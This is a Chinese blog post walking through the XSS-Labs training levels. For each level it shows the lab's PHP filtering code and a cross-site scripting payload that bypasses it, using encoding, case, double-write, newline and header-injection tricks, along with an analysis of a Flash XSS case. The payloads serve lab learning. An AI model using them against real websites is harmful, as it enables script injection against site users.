@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>XSS-Labs - Hannibal0x の Blog</title><meta name="Description" content="Hannibal0x的个人学习博客"><meta property="og:title" content="XSS-Labs" />
+<meta property="og:description" content="Level1 url/?name=&lt;script&gt;alert(1)&lt;/script&gt; Level2 考察符号的闭合 url/?keyword=&#39;&#34;&gt;&lt;script&gt;alert(1)&lt;/script&gt; Level3 htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。考察过滤&lt;、&gt;、&ldquo;等的绕过。 url?keyword=&#39; autofocus onfocus=alert(1)// Level4 会删除掉&lt;和&g" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://hannibal0x.github.io/2021-04-04-xss-labs/" /><meta property="og:image" content="https://hannibal0x.github.io/images/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-04-04T15:13:00+00:00" />
+<meta property="article:modified_time" content="2021-04-04T15:13:00+00:00" /><meta property="og:site_name" content="Hannibal0x の Blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://hannibal0x.github.io/images/logo.png"/>
+
+<meta name="twitter:title" content="XSS-Labs"/>
+<meta name="twitter:description" content="Level1 url/?name=&lt;script&gt;alert(1)&lt;/script&gt; Level2 考察符号的闭合 url/?keyword=&#39;&#34;&gt;&lt;script&gt;alert(1)&lt;/script&gt; Level3 htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。考察过滤&lt;、&gt;、&ldquo;等的绕过。 url?keyword=&#39; autofocus onfocus=alert(1)// Level4 会删除掉&lt;和&g"/>
+<meta name="application-name" content="Hannibal0x の Blog">
+<meta name="apple-mobile-web-app-title" content="Hannibal0x の Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/logo.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hannibal0x.github.io/2021-04-04-xss-labs/" /><link rel="prev" href="https://hannibal0x.github.io/2021-03-31-prompt1-to-win/" /><link rel="next" href="https://hannibal0x.github.io/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9Bssrf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "XSS-Labs",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/hannibal0x.github.io\/2021-04-04-xss-labs\/"
+        },"genre": "posts","keywords": "Web安全, XSS","wordcount":  2015 ,
+        "url": "https:\/\/hannibal0x.github.io\/2021-04-04-xss-labs\/","datePublished": "2021-04-04T15:13:00+00:00","dateModified": "2021-04-04T15:13:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Hannibal0x"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"><i class='fas fa-book'></i> 文章 </a><a class="menu-item" href="/tags/"><i class='fas fa-tags'></i> 标签 </a><a class="menu-item" href="/categories/"><i class='fas fa-folder'></i> 分类 </a><a class="menu-item" href="/categories/writeup"><i class='fas fa-flag'></i> CTF </a><a class="menu-item" href="/about/"><i class='fas fa-key'></i> 关于 </a><a class="menu-item" href="http://hannibal0x.top" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i> 旧博客 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title=""><i class='fas fa-book'></i>文章</a><a class="menu-item" href="/tags/" title=""><i class='fas fa-tags'></i>标签</a><a class="menu-item" href="/categories/" title=""><i class='fas fa-folder'></i>分类</a><a class="menu-item" href="/categories/writeup" title=""><i class='fas fa-flag'></i>CTF</a><a class="menu-item" href="/about/" title=""><i class='fas fa-key'></i>关于</a><a class="menu-item" href="http://hannibal0x.top" title="" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i>旧博客</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">XSS-Labs</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Hannibal0x</a></span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>安全技术</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-04-04">2021-04-04</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2015 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#level1">Level1</a></li>
+    <li><a href="#level2">Level2</a></li>
+    <li><a href="#level3">Level3</a></li>
+    <li><a href="#level4">Level4</a></li>
+    <li><a href="#level5">Level5</a></li>
+    <li><a href="#level6">Level6</a></li>
+    <li><a href="#level7">Level7</a></li>
+    <li><a href="#level8">Level8</a></li>
+    <li><a href="#level9">Level9</a></li>
+    <li><a href="#level10">Level10</a></li>
+    <li><a href="#less11">Less11</a></li>
+    <li><a href="#level12">Level12</a></li>
+    <li><a href="#level13">Level13</a></li>
+    <li><a href="#level14">Level14</a></li>
+    <li><a href="#level15">Level15</a></li>
+    <li><a href="#level16">Level16</a></li>
+    <li><a href="#level17">Level17</a></li>
+    <li><a href="#level18">Level18</a></li>
+    <li><a href="#less19">Less19</a></li>
+    <li><a href="#level20">Level20</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="level1">Level1</h2>
+<pre class="wp-block-code"><code>url/?name=&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+<h2 id="level2">Level2</h2>
+<p>考察符号的闭合</p>
+<pre class="wp-block-code"><code>url/?keyword='"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+<h2 id="level3">Level3</h2>
+<p><code>htmlspecialchars()</code> 函数把预定义的字符转换为 HTML 实体。考察过滤&lt;、&gt;、&ldquo;等的绕过。</p>
+<pre class="wp-block-code"><code>url?keyword=' autofocus onfocus=alert(1)//</code></pre>
+<h2 id="level4">Level4</h2>
+<p>会删除掉&lt;和&gt;</p>
+<pre class="wp-block-code"><code>$str2=str_replace(">","",$str);
+$str3=str_replace("&lt;","",$str2);</code></pre>
+<p>和上一关类似，构造</p>
+<pre class="wp-block-code"><code>url/?keyword=" autofocus onmouseover=alert(1)//</code></pre>
+<h2 id="level5">Level5</h2>
+<p>这关会先全部转成小写，然后替换掉&lt;script和on。</p>
+<pre class="wp-block-code"><code>$str = strtolower($_GET&#91;"keyword"]);
+$str2=str_replace("&lt;script","&lt;scr_ipt",$str);
+$str3=str_replace("on","o_n",$str2);</code></pre>
+<p>利用a标签的href属性执行javascript:伪协议来绕过</p>
+<pre class="wp-block-code"><code>url/?keyword=">&lt;a href='javascript:alert(1)'></code></pre>
+<h2 id="level6">Level6</h2>
+<p>替换多种关键字。</p>
+<pre class="wp-block-code"><code>$str2=str_replace("&lt;script","&lt;scr_ipt",$str);
+$str3=str_replace("on","o_n",$str2);
+$str4=str_replace("src","sr_c",$str3);
+$str5=str_replace("data","da_ta",$str4);
+$str6=str_replace("href","hr_ef",$str5);</code></pre>
+<p>利用大写绕过。</p>
+<pre class="wp-block-code"><code>?keyword=">&lt;Script>alert(1)&lt;/script></code></pre>
+<h2 id="level7">Level7</h2>
+<p>先都转成小写， 再删除多种关键字。</p>
+<pre class="wp-block-code"><code>$str =strtolower( $_GET&#91;"keyword"]);
+$str2=str_replace("script","",$str);
+$str3=str_replace("on","",$str2);
+$str4=str_replace("src","",$str3);
+$str5=str_replace("data","",$str4);
+$str6=str_replace("href","",$str5);</code></pre>
+<p>利用双写来绕过</p>
+<pre class="wp-block-code"><code>url/?keyword=">&lt;scrscriptipt>alert(1)&lt;/scrscriptipt></code></pre>
+<h2 id="level8">Level8</h2>
+<p>与上一题相比，加入了对双引号的过滤，同时对关键字进行替换。</p>
+<pre class="wp-block-code"><code>$str = strtolower($_GET&#91;"keyword"]);
+$str2=str_replace("script","scr_ipt",$str);
+$str3=str_replace("on","o_n",$str2);
+$str4=str_replace("src","sr_c",$str3);
+$str5=str_replace("data","da_ta",$str4);
+$str6=str_replace("href","hr_ef",$str5);
+$str7=str_replace('"','&quot',$str6);</code></pre>
+<p>考虑编码绕过。可以用如下的payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">java&amp;#115;cript:alert(1)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">java&amp;#x73;cript:alert(1)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">java&amp;#x0073;cript:alert(1)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="level9">Level9</h2>
+<p>strpos 查找 &lsquo;http://&lsquo;在字符串中第一次出现的位置。</p>
+<pre class="wp-block-code"><code>if(false===strpos($str7,'http://'))
+{
+  echo '&lt;center>&lt;BR>&lt;a href="您的链接不合法？有没有！">友情链接&lt;/a>&lt;/center>';
+        }</code></pre>
+<p>结合上一关的思想，可以构造如下的payload：</p>
+<pre class="wp-block-code"><code>利用注释1：java&#x73;cript:alert(1)//http://
+利用注释2：java&#x73;cript:alert(1)/*http://*/
+
+利用回车符%0d：java&#x73;cript:%0d/http://%0dalert(1)
+
+利用换行符%0a：java&#x73;cript:%0a/http://%0aalert(1)</code></pre>
+<h2 id="level10">Level10</h2>
+<pre class="wp-block-code"><code>$str = $_GET&#91;"keyword"];
+$str11 = $_GET&#91;"t_sort"];
+$str22=str_replace(">","",$str11);
+$str33=str_replace("&lt;","",$str22);</code></pre>
+<p>构造payload，使得input框显现，或者编辑html。</p>
+<pre class="wp-block-code"><code>t_sort="type="text"  onclick="alert(1)</code></pre>
+<h2 id="less11">Less11</h2>
+<pre class="wp-block-code"><code>$str11=$_SERVER&#91;'HTTP_REFERER'];
+$str22=str_replace(">","",$str11);
+$str33=str_replace("&lt;","",$str22);</code></pre>
+<p>利用bp抓包，构造</p>
+<pre class="wp-block-code"><code>Referer:"type="text" onclick="alert(1)"</code></pre>
+<h2 id="level12">Level12</h2>
+<pre class="wp-block-code"><code>$str11=$_SERVER&#91;'HTTP_USER_AGENT'];
+$str22=str_replace(">","",$str11);
+$str33=str_replace("&lt;","",$str22);</code></pre>
+<p>利用bp构造USER_AGENT</p>
+<pre class="wp-block-code"><code>User-Agent:"type="text" onclick="alert(1)"</code></pre>
+<h2 id="level13">Level13</h2>
+<pre class="wp-block-code"><code>setcookie("user", "call me maybe?", time()+3600);
+$str11=$_COOKIE&#91;"user"];
+$str22=str_replace(">","",$str11);
+$str33=str_replace("&lt;","",$str22);</code></pre>
+<p>这次是构造cookie</p>
+<pre class="wp-block-code"><code>Cookie:user="type="text" onclick="alert(1)";</code></pre>
+<h2 id="level14">Level14</h2>
+<p>本关因<strong>iframe</strong>调用的文件地址失效，无法进行测试。<a href="https://www.hackersb.cn/hacker/140.html" target="_blank" rel="noreferrer noopener" rel="nofollow" ><a href="https://www.hackersb.cn/hacker/140.html" target="_blank" rel="noopener noreffer ">https://www.hackersb.cn/hacker/140.html</a></a></p>
+<h2 id="level15">Level15</h2>
+<p>看了大佬的博客才知道，是考察angular js中的ng-include问题，ng-include 指令用于包含外部的HTML文件。包含的内容将作为指定元素的子节点。ng-include属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一域名下。</p>
+<p>构造<code>src='level1.php?name=&lt;img src=x onerror=alert(1)&gt;'</code></p>
+<h2 id="level16">Level16</h2>
+<p>替换空格、Tab、/符号。</p>
+<pre class="wp-block-code"><code>$str = strtolower($_GET&#91;"keyword"]);
+$str2=str_replace("script","&nbsp;",$str);
+$str3=str_replace(" ","&nbsp;",$str2);
+$str4=str_replace("/","&nbsp;",$str3);
+$str5=str_replace("	","&nbsp;",$str4);
+echo "&lt;center>".$str5."&lt;/center>";</code></pre>
+<p>可以用%0a或%0d绕过。</p>
+<pre class="wp-block-code"><code>url/?keyword=&lt;img%0a
+src=a%0a
+onerror=alert(1)></code></pre>
+<h2 id="level17">Level17</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo &#34;&lt;embed src=xsf01.swf?&#34;.htmlspecialchars($_GET[&#34;arg01&#34;]).&#34;=&#34;.htmlspecialchars($_GET[&#34;arg02&#34;]).&#34; width=100% heigth=100%&gt;&#34;;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>&lt;embed&gt;</code>标签就是引入一个<code>swf文件</code>到浏览器端(火狐不支持swf)</p>
+<pre class="wp-block-code"><code>url/?arg01=1&arg02= onmouseover=alert(1)</code></pre>
+<h2 id="level18">Level18</h2>
+<p>和上一题一样</p>
+<h2 id="less19">Less19</h2>
+<p>这一关涉及一种xss攻击手段叫做flash xss，学习参考<a rel="noreferrer noopener" href="https://cloud.tencent.com/developer/article/1089548" target="_blank" rel="nofollow" ><a href="https://cloud.tencent.com/developer/article/1089548" target="_blank" rel="noopener noreffer ">https://cloud.tencent.com/developer/article/1089548</a></a>。要判断是否属于flash xss，需要对引用的swf文件进行反编译然后进行源码分析，安装<a rel="noreferrer noopener" href="https://github.com/jindrapetrik/jpexs-decompiler/releases/tag/version14.4.0" target="_blank" rel="nofollow" ><a href="https://github.com/jindrapetrik/jpexs-decompiler/releases/tag/version14.4.0" target="_blank" rel="noopener noreffer ">https://github.com/jindrapetrik/jpexs-decompiler/releases/tag/version14.4.0</a></a>。</p>
+<p>Flash产生的xss问题主要有两种方式：1、加载第三方资源；2、与javascript通信引发xss。</p>
+<p id="0x03-%E5%B8%B8%E8%A7%81Flash-xss%E5%88%86%E7%B1%BB%E6%80%BB%E7%BB%93">
+  <strong>常见Flash xss危险函数总结</strong>
+</p>
+<p>Flash提供相关的函数，可以执行js代码，<code>getURL</code>(AS2中支持)，<code>navigateToURL</code>(AS3中支持)。</p>
+<p><code>ExternalInterface.call</code>同样是一个Flash提供的可以执行js的接口函数， 它有两个参数，形如<code>ExternalInterface.call(&quot;函数名&quot;,&quot;参数1&quot;)</code>，Flash最后执行的JS代码是<code>try { __Flash__toXML(函数名(&quot;参数1&quot;)) ; } catch (e) { &quot;&lt;undefined/&gt;&quot;; }</code>。</p>
+<p><code>htmlText</code>，Flash支持在Flash里内嵌html，支持的标签img标签，a标签等。 img标签可以通过src参数引入一个Flash文件，类似与XSF一样。</p>
+<p><code>addcallback</code>与<code>lso</code>结合，这个问题出现的点在addCallback声明的函数，在被html界面js执行之后的返回值攻击者可控，导致了xss问题。使用lso中首先会setlso，写入脏数据，然后getlso获取脏数据。</p>
+<p>跨站Flash即XSF，通过AS加载第三方的Flash文件，如果这个第三方Flash可以被控制，就可以实现XSF。 在AS2中使用<code>loadMove</code>函数等加载第三方Flash。</p>
+<p><strong>开始复现</strong></p>
+<p>参考：<a href="https://www.jianshu.com/p/4e3a517bc4ea" target="_blank" rel="noreferrer noopener" rel="nofollow" ><a href="https://www.jianshu.com/p/4e3a517bc4ea" target="_blank" rel="noopener noreffer ">https://www.jianshu.com/p/4e3a517bc4ea</a></a>，首先导入xsf03.swf文件，然后定位getURL函数。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/image-83.png" alt="" class="wp-image-3031" width="590" height="266" /> </figure></p>
+<p>追踪到sIFR的内容<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/image-84.png" alt="" class="wp-image-3032" width="599" height="261" /> </figure></p>
+<p>得知version参数可以传入loc4变量中，即sIFR的内容中，但是getURL只在内容为link时打开，所以分析contentIsLink函数。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">function contentIsLink()
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">      return this.content.indexOf(&#34;&lt;a &#34;) == 0 &amp;&amp; (this.content.indexOf(&#34;&lt;a &#34;) == this.content.lastIndexOf(&#34;&lt;a &#34;) &amp;&amp; this.content.indexOf(&#34;&lt;/a&gt;&#34;) == this.content.length - 4);
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以可以通过构造<code>&lt;a&gt;</code>标签来传值。payload如下：</p>
+<pre class="wp-block-code"><code>url?arg01=version&arg02=&lt;a href="javascript:alert(1)">1&lt;/a></code></pre>
+<h2 id="level20">Level20</h2>
+<p>不会。。。先埋个坑吧。。。</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-04-04</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/2021-04-04-xss-labs/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://hannibal0x.github.io/2021-04-04-xss-labs/" data-title="XSS-Labs" data-hashtags="Web安全,XSS"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://hannibal0x.github.io/2021-04-04-xss-labs/" data-hashtag="Web安全"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://hannibal0x.github.io/2021-04-04-xss-labs/" data-title="XSS-Labs"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://hannibal0x.github.io/2021-04-04-xss-labs/" data-title="XSS-Labs"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://hannibal0x.github.io/2021-04-04-xss-labs/" data-title="XSS-Labs"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/web%E5%AE%89%E5%85%A8/">Web安全</a>,&nbsp;<a href="/tags/xss/">XSS</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2021-03-31-prompt1-to-win/" class="prev" rel="prev" title="prompt(1) to win"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>prompt(1) to win</a>
+            <a href="/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9Bssrf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="next" rel="next" title="安全牛SSRF学习笔记">安全牛SSRF学习笔记<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="utterances" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">utterances</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.101.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Hannibal0x</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hannibal0x/blog-comment"}},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"algoliaAppID":"LBWAPJR4IC","algoliaIndex":"blog","algoliaSearchKey":"3771060ae26cbca6e13551298e854580","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
